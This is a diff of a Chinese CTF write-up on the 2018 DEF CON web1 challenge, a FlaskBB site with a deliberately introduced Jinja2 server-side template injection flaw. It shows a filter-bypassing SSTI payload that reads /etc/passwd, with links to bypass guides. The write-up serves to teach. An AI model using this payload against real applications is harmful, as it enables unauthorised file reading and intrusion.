@@ -5,7 +5,19 @@ docker-compose up -d
 ```
 该题是2018年Defcon对抗赛的web1，该网站用的是flaskbb搭建的，本身没有存在漏洞，开发人员通过修改了源代码造成了SSTI漏洞，现在凡是涉及Flask的安全问题几乎都会重点提及SSTI
 
+SSTI的漏洞主要涉及两个函数
+
+```
+from flask import render_template_string
+
+from jinja2 import Template
+```
+
+
+
+
 漏洞源码在flasks/app.py文件中的375行开始
+
 ```
    375	    @app.errorhandler(404)
    376	    def page_not_found(error):
@@ -20,6 +32,7 @@ docker-compose up -d
 ## 0x01 漏洞利用
 
 通过之前的代码显示，过滤了中括号，上网搜索了一下找到了绕过的payload
+
 文件读取payload
 ```
 {{''.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)('/etc/passwd').read()}}
@@ -42,7 +55,9 @@ docker-compose up -d
 ##  0x02 链接
 
 [SSTI过滤绕过](http://p0sec.net/index.php/archives/120/)
+
 [SSTI攻击分析](https://hellohxk.com/blog/ssti/)
+
 [Flask jinja2模板注入思路总结](http://www.ee50.com/ld/940.html)
 
 
